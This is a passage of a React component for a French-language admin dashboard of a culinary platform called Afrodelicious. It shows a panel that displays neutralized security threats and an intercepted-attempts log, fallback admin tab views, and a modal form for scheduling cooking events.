                              <span className="px-2.5 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 text-xs font-bold font-mono flex items-center gap-1.5 border border-emerald-500/30">
                                ✓ PAYLOAD SÉCURISÉ / NEUTRE
                              </span>
                            )}
                          </div>
                          <span className="text-[10px] text-slate-500 font-mono">
                            Horodatage : {activeThreatReport.timestamp}
                          </span>
                        </div>

                        {activeThreatReport.description && (
                          <p className="text-xs text-slate-300 leading-relaxed">
                            {activeThreatReport.description}
                          </p>
                        )}

                        <div className="grid grid-cols-1 md:grid-cols-2 gap-3 pt-2 border-t border-slate-900 text-xs font-mono">
                          <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
                            <span className="text-[10px] text-slate-500 uppercase tracking-wider block mb-1">
                              Payload attaquant injecté :
                            </span>
                            <span className="text-rose-300 break-all select-all">
                              {activeThreatReport.originalPayload}
                            </span>
                          </div>

                          <div className="p-3 rounded-xl bg-slate-900 border border-emerald-900/50">
                            <span className="text-[10px] text-emerald-400 uppercase tracking-wider block mb-1">
                              Résultat assaini par Afrodelicious :
                            </span>
                            <span className="text-emerald-300 break-all select-all font-bold">
                              {activeThreatReport.sanitizedPayload || '[CONTENU NEUTRALISÉ & ÉCHAPPÉ]'}
                            </span>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>

                  {/* Security Audit Live Log */}
                  <div className="p-5 rounded-3xl bg-white border border-slate-200 shadow-2xs space-y-3">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <ShieldCheck className="w-4 h-4 text-emerald-600" />
                        <h4 className="font-bold text-xs text-slate-900 uppercase tracking-wider">
                          Journal des Tentatives Interceptées
                        </h4>
                      </div>
                      <span className="text-[11px] text-slate-400 font-mono">
                        Derniers événements
                      </span>
                    </div>

                    <div className="divide-y divide-slate-100 font-mono text-xs">
                      {securityEventsLog.map((ev) => (
                        <div key={ev.id} className="py-2.5 flex items-center justify-between gap-3 flex-wrap">
                          <div className="flex items-center gap-3">
                            <span className="text-slate-400 text-[11px]">{ev.time}</span>
                            <span className="font-bold text-slate-800">{ev.threat}</span>
                          </div>
                          <div className="flex items-center gap-2">
                            <span className="text-slate-500 text-[11px]">{ev.action}</span>
                            <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-100 text-emerald-800">
                              Neutralisé
                            </span>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              )}

              {/* ========================================================== */}
              {/* OTHER TABS FALLBACK (Delivery, Courses, FAQs, etc.)        */}
              {/* ========================================================== */}
              {(activeTab === 'delivery' || activeTab === 'courses' || activeTab === 'experiences' || activeTab === 'recommended' || activeTab === 'grocery_list' || activeTab === 'stories' || activeTab === 'faqs') && (
                <div className="p-8 rounded-3xl bg-white border border-slate-200 text-center space-y-4">
                  <div className="w-16 h-16 rounded-3xl bg-orange-100 text-[#FF4E27] flex items-center justify-center mx-auto font-black shadow-md">
                    <ShieldCheck className="w-8 h-8" />
                  </div>
                  <h3 className="font-serif font-black text-lg text-slate-900 capitalize">
                    Module d'Administration : {activeTab.replace('_', ' ')}
                  </h3>
                  <p className="text-xs text-slate-500 max-w-md mx-auto">
                    Ce module est pleinement opérationnel sur la plateforme. Vous pouvez gérer ses accès via l'onglet <strong className="text-slate-800">Contrôle Fonctionnalités</strong> ou basculer vers la vue correspondante.
                  </p>
                  <div className="flex items-center justify-center gap-2">
                    <button
                      type="button"
                      onClick={() => setActiveTab('feature_flags')}
                      className="px-4 py-2 rounded-xl bg-slate-900 text-white text-xs font-bold hover:bg-black transition-all"
                    >
                      Gérer l'activation
                    </button>
                    {onNavigateToTab && (
                      <button
                        type="button"
                        onClick={() => {
                          onClose();
                          onNavigateToTab(activeTab === 'delivery' ? 'delivery' : activeTab === 'recommended' ? 'recommended' : 'feed');
                        }}
                        className="px-4 py-2 rounded-xl border border-slate-200 hover:bg-slate-50 text-slate-700 text-xs font-bold transition-all"
                      >
                        Ouvrir dans l'application
                      </button>
                    )}
                  </div>
                </div>
              )}

            </div>

          </main>

        </div>

      </div>

      {/* ============================================================ */}
      {/* MODAL: AJOUTER UN ÉVÉNEMENT AU CALENDRIER                     */}
      {/* ============================================================ */}
      {isAddEventModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-md">
          <div className="bg-white rounded-3xl p-6 max-w-md w-full shadow-2xl border border-slate-200 space-y-4 animate-in fade-in zoom-in-95">
            <div className="flex items-center justify-between pb-2 border-b border-slate-100">
              <h3 className="font-serif font-black text-base text-slate-900">
                Planifier un Nouvel Événement Culinaire
              </h3>
              <button onClick={() => setIsAddEventModalOpen(false)} className="p-1 rounded-lg hover:bg-slate-100">
                <X className="w-4 h-4 text-slate-400" />
              </button>
            </div>

            <form onSubmit={handleAddEvent} className="space-y-3 text-xs">
              <div className="space-y-1">
                <label className="font-bold text-slate-700 block">Titre de la session :</label>
                <input
                  type="text"
                  required
                  placeholder="Ex: Masterclass Bokits & Ti Kréyol"
                  value={newEventTitle}
                  onChange={(e) => setNewEventTitle(e.target.value)}
                  className="w-full p-2.5 rounded-xl border border-slate-200 bg-slate-50 focus:bg-white text-xs font-bold focus:outline-none focus:border-[#FF4E27]"
                />
              </div>

              <div className="grid grid-cols-2 gap-2">
                <div className="space-y-1">
                  <label className="font-bold text-slate-700 block">Date :</label>
                  <input
                    type="date"
                    required
                    value={newEventDate}
                    onChange={(e) => setNewEventDate(e.target.value)}
                    className="w-full p-2 rounded-xl border border-slate-200 bg-slate-50 text-xs font-bold"
                  />
                </div>
                <div className="space-y-1">
                  <label className="font-bold text-slate-700 block">Heure :</label>
                  <input
                    type="time"
                    required
                    value={newEventTime}
                    onChange={(e) => setNewEventTime(e.target.value)}
                    className="w-full p-2 rounded-xl border border-slate-200 bg-slate-50 text-xs font-bold"
                  />
                </div>
              </div>

              <div className="space-y-1">
                <label className="font-bold text-slate-700 block">Type d'événement :</label>
                <select
                  value={newEventType}
                  onChange={(e) => setNewEventType(e.target.value as any)}
                  className="w-full p-2.5 rounded-xl border border-slate-200 bg-slate-50 text-xs font-bold"
                >
                  <option value="masterclass">🎓 Masterclass en Direct</option>
                  <option value="experience">🍽️ Table d'Hôtes & Dégustation</option>
                  <option value="workshop">🔪 Atelier de Cuisine</option>
                  <option value="delivery_batch">🚚 Vague de Livraison Spéciale</option>
                  <option value="tasting">🌶️ Dégustation d'Épices</option>
                </select>
              </div>

              <div className="space-y-1">
                <label className="font-bold text-slate-700 block">Chef / Hôte :</label>
                <input
                  type="text"
                  value={newEventHost}
                  onChange={(e) => setNewEventHost(e.target.value)}
                  className="w-full p-2.5 rounded-xl border border-slate-200 bg-slate-50 text-xs font-bold"
                />
              </div>

              <div className="space-y-1">
                <label className="font-bold text-slate-700 block">Lieu / Lien Studio :</label>
                <input
                  type="text"
                  value={newEventLocation}
                  onChange={(e) => setNewEventLocation(e.target.value)}
                  className="w-full p-2.5 rounded-xl border border-slate-200 bg-slate-50 text-xs font-bold"
                />
              </div>

              <div className="pt-2 flex items-center justify-end gap-2">
                <button
                  type="button"
                  onClick={() => setIsAddEventModalOpen(false)}
                  className="px-3.5 py-2 rounded-xl border border-slate-200 text-slate-600 font-bold hover:bg-slate-50"
                >
                  Annuler
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 rounded-xl bg-[#FF4E27] text-white font-black shadow-md hover:bg-[#E03814]"
                >
                  Planifier
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

    </div>
  );
};
